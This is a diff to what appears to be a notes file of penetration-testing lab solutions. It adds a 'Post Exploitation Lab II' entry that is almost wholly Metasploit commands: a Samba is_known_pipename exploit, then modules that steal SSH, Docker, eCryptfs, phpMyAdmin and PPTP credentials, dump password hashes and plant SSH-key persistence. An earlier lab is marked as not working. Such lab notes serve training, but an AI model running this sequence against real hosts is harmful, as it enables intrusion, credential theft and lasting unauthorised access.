@@ -1513,7 +1513,7 @@ set URL http://192.162.5.2/test.sh
 set SESSION 1
 run
 ```
-77)  Privilege Escalation - Rootkit Scanner
+77)  Privilege Escalation - Rootkit Scanner **NOT WORK**
 
 ```
 nmap -sS -sV 192.14.195.3
@@ -1534,7 +1534,42 @@ set LHOST 192.14.195.2
 exploit
 cat /root/flag
 ```
-
+78) Post Exploitation Lab II
+```
+nmap -sS -sV -p- 192.91.98.3
+use exploit/linux/samba/is_known_pipename
+set RHOST 192.91.98.3
+check
+exploit -z
+use post/multi/gather/ssh_creds
+set SESSION 1
+run
+use post/multi/gather/docker_creds
+set SESSION 1
+run
+use post/linux/gather/hashdump
+set SESSION 1
+set VERBOSE true
+run
+use post/linux/gather/ecryptfs_creds
+set SESSION 1
+run
+use post/linux/gather/enum_psk
+set SESSION 1
+run
+use post/linux/gather/enum_xchat
+set SESSION 1
+run
+use post/linux/gather/phpmyadmin_credsteal
+set SESSION 1
+run
+use post/linux/gather/pptpd_chap_secrets
+set SESSION 1
+run
+use post/linux/manage/sshkey_persistence
+set SESSION 1
+run 
+```    
 
 
 
